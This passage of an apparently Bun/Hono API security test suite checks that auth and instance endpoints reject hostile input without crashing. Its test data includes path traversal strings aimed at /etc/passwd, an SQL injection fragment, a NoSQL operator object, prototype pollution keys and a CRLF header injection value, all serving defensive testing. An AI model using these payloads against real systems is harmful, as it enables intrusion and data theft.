  });
});

// ===========================================================================
// Section F — PATH TRAVERSAL in DELETE /instances/:id
//
// The instance ID is passed as a URL path parameter and used directly in
// a Drizzle eq() call. These tests verify that traversal sequences in the
// path do not cause routing confusion, filesystem reads, or 500 errors.
// ===========================================================================

describe("Path traversal in DELETE /instances/:id", () => {
  const traversalIds = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",   // URL-encoded /
    "..%5C..%5Csystem32",             // URL-encoded backslash
    "....//....//etc/passwd",         // double-dot slash variant
    "%2e%2e%2f%2e%2e%2f",            // double URL-encoded
    "krn_inst_valid/../../../admin",
    " ",                              // whitespace-only ID
    "",                               // empty ID (will likely 404 at routing level)
  ];

  for (const id of traversalIds) {
    it(`traversal id: ${JSON.stringify(id)}`, async () => {
      const token = await makeUserToken();
      mockDeleteReturns([]);
      const encodedId = encodeURIComponent(id);
      const response = await app.request(
        deleteReq(`/instances/${encodedId}`, token)
      );
      // The Drizzle WHERE clause treats the string as a literal ID value.
      // No rows match → 404. No path is accessed → no traversal possible.
      // Must not be 500.
      expect(response.status).not.toBe(500);
      expect([400, 404]).toContain(response.status);
    });
  }

  it("instance ID with SQL fragment (SELECT 1--)", async () => {
    const token = await makeUserToken();
    mockDeleteReturns([]);
    const response = await app.request(
      deleteReq(`/instances/${encodeURIComponent("' OR 1=1--")}`, token)
    );
    expect(response.status).not.toBe(500);
    expect([400, 404]).toContain(response.status);
  });

  it("instance ID that is a valid UUID but belongs to another user (IDOR check)", async () => {
    // The WHERE uses AND(id, user_id) so another user's instance ID returns 0 rows → 404.
    const token = await makeUserToken("krn_usr_alice");
    mockDeleteReturns([]); // ownership check fails — no rows returned
    const response = await app.request(
      deleteReq("/instances/krn_inst_bob_inst001", token)
    );
    expect(response.status).toBe(404);
    await assertErrorShape(response);
  });
});

// ===========================================================================
// Section G — TYPE CONFUSION
//
// Numbers, booleans, objects, and arrays submitted where scalar strings
// are expected. The validation helpers in auth.ts and instances.ts use
// typeof checks — these inputs must produce 400, not 500.
// ===========================================================================

describe("Type confusion — /auth/register", () => {
  it("email is a number", async () => {
    const response = await app.request(
      jsonPost("/auth/register", { email: 42, name: "Test", password: "password123" })
    );
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("email is a boolean", async () => {
    const response = await app.request(
      jsonPost("/auth/register", { email: true, name: "Test", password: "password123" })
    );
    expect(response.status).toBe(400);
  });

  it("email is an array", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: ["admin@test.com", "other@test.com"],
        name: "Test",
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
  });

  it("email is an object (NoSQL-style injection attempt)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: { $ne: null },
        name: "Test",
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("name is a number", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: 12345,
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
  });

  it("name is an array of strings", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: ["First", "Last"],
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
  });

  it("password is a boolean", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "Test",
        password: false,
      })
    );
    expect(response.status).toBe(400);
  });

  it("password is a number", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "Test",
        password: 12345678,
      })
    );
    expect(response.status).toBe(400);
  });

  it("entire body is a nested object with prototype pollution keys", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        "__proto__": { isAdmin: true },
        "constructor": { prototype: { isAdmin: true } },
        email: "test@test.com",
        name: "Test",
        password: "password123",
      })
    );
    // Must not crash; prototype pollution via JSON.parse is largely blocked in V8
    // but we verify the server handles it gracefully.
    expect(response.status).not.toBe(500);
  });
});

describe("Type confusion — /instances/register", () => {
  it("public_key is a number", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", { public_key: 9999 }, token)
    );
    expect(response.status).toBe(400);
  });

  it("public_key is a boolean", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", { public_key: true }, token)
    );
    expect(response.status).toBe(400);
  });

  it("public_key is an object", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", { public_key: { kty: "OKP" } }, token)
    );
    expect(response.status).toBe(400);
  });

  it("machine_fingerprint is a number", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", {
        public_key: "validpk",
        machine_fingerprint: 12345,
      }, token)
    );
    expect(response.status).toBe(400);
  });

  it("kronus_version is an array", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", {
        public_key: "validpk",
        kronus_version: ["5", "3", "0"],
      }, token)
    );
    expect(response.status).toBe(400);
  });

  it("os is a boolean", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", {
        public_key: "validpk",
        os: true,
      }, token)
    );
    expect(response.status).toBe(400);
  });
});

describe("Type confusion — /instances/heartbeat", () => {
  it("kronus_version is a number", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      jsonPost("/instances/heartbeat", { kronus_version: 530 }, token)
    );
    expect(response.status).toBe(400);
  });

  it("installed_apps is a string instead of array", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      jsonPost("/instances/heartbeat", { installed_apps: "krn_app_single" }, token)
    );
    expect(response.status).toBe(400);
  });

  it("installed_apps is a boolean", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      jsonPost("/instances/heartbeat", { installed_apps: true }, token)
    );
    expect(response.status).toBe(400);
  });
});

// ===========================================================================
// Section H — HEADER MANIPULATION
//
// Tests for missing/wrong Content-Type, lowercase "bearer", token in query
// param, empty Authorization value, and oversized headers.
// ===========================================================================

describe("Header manipulation — Content-Type", () => {
  it("/auth/register — no Content-Type header (body is still valid JSON)", async () => {
    const response = await app.request(
      new Request("http://localhost/auth/register", {
        method: "POST",
        // No Content-Type header
        body: JSON.stringify({
          email: "test@test.com",
          name: "Test",
          password: "password123",
        }),
      })
    );
    // Hono may or may not enforce Content-Type for JSON parsing.
    // Must not crash (500).
    expect(response.status).not.toBe(500);
  });

  it("/auth/register — Content-Type: text/plain with JSON body", async () => {
    const response = await app.request(
      rawRequest(
        "POST",
        "/auth/register",
        JSON.stringify({ email: "test@test.com", name: "Test", password: "password123" }),
        { "Content-Type": "text/plain" }
      )
    );
    // c.req.json() may fail when Content-Type is wrong. Must not be 500.
    expect(response.status).not.toBe(500);
  });

  it("/auth/register — Content-Type: multipart/form-data with JSON body", async () => {
    const response = await app.request(
      rawRequest(
        "POST",
        "/auth/register",
        JSON.stringify({ email: "test@test.com", name: "Test", password: "password123" }),
        { "Content-Type": "multipart/form-data" }
      )
    );
    expect(response.status).not.toBe(500);
  });

  it("/auth/register — Content-Type: application/x-www-form-urlencoded with JSON body", async () => {
    const response = await app.request(
      rawRequest(
        "POST",
        "/auth/register",
        "email=test%40test.com&name=Test&password=password123",
        { "Content-Type": "application/x-www-form-urlencoded" }
      )
    );
    expect(response.status).not.toBe(500);
  });
});

describe("Header manipulation — Authorization header", () => {
  it("lowercase 'bearer' prefix is rejected (middleware checks startsWith('Bearer '))", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          // lowercase 'b' — requireAuth checks exact 'Bearer ' prefix
          Authorization: `bearer ${token}`,
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).toBe(401);
  });

  it("BEARER (all-caps) prefix is rejected", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `BEARER ${token}`,
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).toBe(401);
  });

  it("token in query param (?token=...) instead of Authorization header is rejected", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request(`http://localhost/instances/register?token=${token}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).toBe(401);
  });

  it("token in X-Auth-Token custom header is rejected (not in Authorization)", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Auth-Token": token,
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).toBe(401);
  });

  it("Authorization header value is 'Bearer' with no token after the space", async () => {
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: "Bearer ",
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).toBe(401);
  });

  it("Authorization header is present but empty string", async () => {
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: "",
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).toBe(401);
  });

  it("oversized Authorization header (8 KB token-like string)", async () => {
    const bigHeader = `Bearer ${"A".repeat(8 * 1024)}`;
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: bigHeader,
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    // jose should reject the malformed token; must not be 500.
    expect(response.status).not.toBe(500);
    expect(response.status).toBe(401);
  });

  it("Authorization header contains embedded newlines", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          // Header injection attempt via CRLF in value
          Authorization: `Bearer ${token}\r\nX-Injected: yes`,
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    // fetch() in Bun will either reject the request at the network layer or
    // the header value will be sanitized. Must not be 500.
    expect(response.status).not.toBe(500);
  });

  it("multiple Authorization headers (only the last or first should be used, not both)", async () => {
    // The Fetch API enforces unique header names — the second value wins or is
    // concatenated. Both scenarios should not produce 500.
    const token1 = await makeUserToken("krn_usr_alice");
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: new Headers([
          ["Content-Type", "application/json"],
          ["Authorization", `Bearer ${token1}`],
          ["Authorization", "Bearer invalid.token.here"],
        ]),
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    // Headers API combines duplicate header values with ", "
    // The combined value won't start with a single valid "Bearer <jwt>" — reject.
    expect(response.status).not.toBe(500);
  });
});

// ===========================================================================
// Section I — AUTH BYPASS ATTEMPTS ON /auth/* ENDPOINTS
//
// These routes are unauthenticated (no requireAuth middleware), so the tests
// here focus on ensuring that injected-looking tokens in unexpected places
// do not cause unexpected behavior.
// ===========================================================================

describe("Auth bypass attempts — /auth endpoints (unauthenticated routes)", () => {
  it("Authorization header on /auth/register does not bypass validation", async () => {
    // Sending a valid Bearer token to an unauthenticated route should have no
    // effect — the route still validates the body fields normally.
    const token = await makeUserToken();
    const response = await app.request(
      new Request("http://localhost/auth/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          // Invalid body — missing name
          email: "test@test.com",
          password: "password123",
        }),
      })
    );
    // Body validation must still run — 400 expected.
    expect(response.status).toBe(400);
  });

  it("/auth/login — mass assignment: sending extra fields like isAdmin or role", async () => {
    mockSelectReturns([]);
    const response = await app.request(
      jsonPost("/auth/login", {
        email: "test@test.com",
        password: "password123",
        isAdmin: true,
        role: "admin",
        plan: "enterprise",
      })
    );
    // Extra fields are ignored at the validateLoginBody layer.
    // DB will return [] → 401 (no user found). Must not be 500 or 200.
    expect(response.status).not.toBe(500);
    expect([400, 401]).toContain(response.status);
  });

  it("/auth/register — mass assignment: sending id, plan, stripe_customer_id", async () => {
    mockSelectReturns([]);
    mockInsertReturns([
      {
        id: TEST_USER_ID,
        email: "test@test.com",
        name: "Test",
        plan: "free", // must be "free" regardless of what was sent
      },
    ]);
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "Test",
        password: "password123",
        plan: "enterprise",         // attempt to set plan
        id: "krn_usr_custom001",    // attempt to set ID
        stripe_customer_id: "cus_hacked",
      })
    );
    if (response.status === 201) {
      const body = (await response.json()) as { user: { plan: string } };
      // The mock returns "free" — the extra fields must not have changed it.
      expect(body.user.plan).toBe("free");
    } else {
      // 400 is also acceptable if extra fields cause schema validation to fail.
      expect([400, 201]).toContain(response.status);
    }
    expect(response.status).not.toBe(500);
  });

  it("/auth/refresh — access token used as refresh token is rejected", async () => {
    const accessToken = await makeUserToken();
    const response = await app.request(
      jsonPost("/auth/refresh", { refresh_token: accessToken })
    );
    // validateRefreshBody passes (it's a non-empty string), but verifyToken will
    // succeed for the signature, and then the type !== "refresh" check triggers 401.
    expect(response.status).toBe(401);
    const body = (await response.json()) as { error: { code: string } };
    expect(body.error.code).toBe("UNAUTHORIZED");
  });
});

// ===========================================================================
// Section J — HTTP METHOD CONFUSION
//
// Sending the wrong HTTP method to each endpoint. Hono returns 404 or 405.
// These must never be 500.
// ===========================================================================

describe("HTTP method confusion", () => {
  const authBody = JSON.stringify({ email: "t@t.com", name: "T", password: "password123" });

  it("GET /auth/register", async () => {
    const response = await app.request(
      new Request("http://localhost/auth/register", { method: "GET" })
    );
    expect(response.status).not.toBe(500);
    expect([404, 405]).toContain(response.status);
  });

  it("PUT /auth/login", async () => {
    const response = await app.request(
      new Request("http://localhost/auth/login", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: authBody,
      })
    );
    expect(response.status).not.toBe(500);
    expect([404, 405]).toContain(response.status);
  });

  it("DELETE /auth/refresh", async () => {
    const response = await app.request(
      new Request("http://localhost/auth/refresh", { method: "DELETE" })
    );
    expect(response.status).not.toBe(500);
    expect([404, 405]).toContain(response.status);
  });

  it("PATCH /instances/register", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).not.toBe(500);
    expect([404, 405]).toContain(response.status);
  });

  it("POST /instances/:id (DELETE method expected)", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request(`http://localhost/instances/${TEST_INSTANCE_ID}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: "{}",
      })
    );
    expect(response.status).not.toBe(500);
    expect([404, 405]).toContain(response.status);
  });
});

// ===========================================================================
// Section K — RESPONSE SHAPE CONTRACT
//
// For all error categories (400, 401, 403, 404, 409), the error handler must
// return { error: { code: string, message: string } }. These tests cross-cut
// all endpoints and verify the contract holds under adversarial conditions.
// ===========================================================================

describe("Error response shape contract — all error paths return structured JSON", () => {
  it("401 on /instances/register has structured error", async () => {
    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" })
      // No token
    );
    expect(response.status).toBe(401);
    await assertErrorShape(response);
  });

  it("400 on /auth/register (missing all fields) has structured error", async () => {
    const response = await app.request(jsonPost("/auth/register", {}));
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("400 on /auth/register (type confusion email) has structured error", async () => {
    const response = await app.request(
      jsonPost("/auth/register", { email: [], name: "T", password: "password123" })
    );
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("401 on /auth/refresh (garbage token) has structured error", async () => {
    const response = await app.request(
      jsonPost("/auth/refresh", { refresh_token: "garbage.garbage.garbage" })
    );
    expect(response.status).toBe(401);
    await assertErrorShape(response);
  });

  it("404 on DELETE /instances/:id (non-existent ID) has structured error", async () => {
    const token = await makeUserToken();
    mockDeleteReturns([]);
    const response = await app.request(
      deleteReq("/instances/krn_inst_nonexistent", token)
    );
    expect(response.status).toBe(404);
    await assertErrorShape(response);
  });

  it("401 on DELETE /instances/:id (no auth) has structured error", async () => {
    const response = await app.request(
      deleteReq(`/instances/${TEST_INSTANCE_ID}`)
    );
    expect(response.status).toBe(401);
    await assertErrorShape(response);
  });

  it("Content-Type of all error responses is application/json", async () => {
    const response = await app.request(jsonPost("/auth/register", {}));
    const ct = response.headers.get("content-type") ?? "";
    expect(ct).toContain("application/json");
  });
});
